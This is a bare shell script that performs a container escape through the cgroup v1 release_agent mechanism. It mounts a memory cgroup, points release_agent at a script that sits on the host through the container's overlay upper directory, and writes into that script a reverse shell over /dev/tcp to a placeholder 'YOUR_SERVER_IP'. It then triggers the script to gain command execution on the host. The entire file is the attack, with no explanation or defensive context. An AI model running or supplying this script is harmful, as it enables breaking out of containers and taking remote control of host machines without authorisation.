#!/bin/sh

mkdir -p /tmp/cgrp; mount -t cgroup -o memory cgroup /tmp/cgrp; mkdir -p /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "0<&108-;exec 108<>/dev/tcp/YOUR_SERVER_IP/YOUR_SERVER_IP;sh <&108 >&108 2>&108 > $host_path/output" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
